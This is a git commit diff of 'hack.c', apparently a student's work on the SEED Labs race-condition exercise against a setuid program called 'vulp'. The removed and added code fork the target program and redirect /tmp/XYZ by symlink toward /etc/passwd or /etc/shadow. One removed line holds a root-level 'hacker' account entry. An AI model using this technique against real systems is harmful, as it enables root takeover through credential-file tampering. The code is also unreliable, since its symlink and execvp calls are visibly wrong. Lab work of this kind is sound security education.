0bbca6eae42499ff2aa383ada5fe557771fb1e82
root <root@ubuntu.(none)>
2016-12-09 13:58:22 -0500

    Rename payload.txt to payload1.txt and work on hack.c.

--- hack.c
+++ hack.c
@@ -4,19 +4,31 @@
 #include <stdio.h>
 
 int main(int argc, char** argv) {
-	char* passwdPayload = "hacker:x:0:0:hacker:/:/bin/bash";
-	char* shadowPayload = "hacker:x:0:0:hacker:/:/bin/bash";
-	
-	unlink("/tmp/XYZ");
-	symlink("/etc/passwd", "tmp/XYZ");
-	
-	//Fork a child process to run vulp
-	int pid = fork();
-	if(pid == 0) {
-		printf("Child Process running vulp\n");
-		execvp("vulp", passwdPayload);
-	}
-	wait();
-	printf("Parent Process\n");
-	return 0;	
+    //char* payloadPath1 = "/home/seed/Labs/vulp/payload1.txt";
+    //char* payloadPath2 = "/home/seed/Labs/vulp/payload2.txt";
+    
+    printf("Running '%s'\n", argv[0]);
+    
+    /*
+    while(1) {
+        unlink("/tmp/XYZ");
+        symlink("/tmp/XYZ", "/etc/shadow");
+    }
+    */
+    
+    const char* xyz = "/tmp/XYZ";
+    const char* shadow = "/etc/shadow";
+
+    int pid = fork();
+    if(pid == 0) {
+        printf("Child executing vulp.\n");
+        execvp("./vulp", argv);
+    }
+    else {
+        wait();
+        printf("Parent unlinking and symlinking.\n");
+        unlink("/tmp/XYZ");
+        symlink(xyz, shadow);
+    }
+    return 0;	
 }
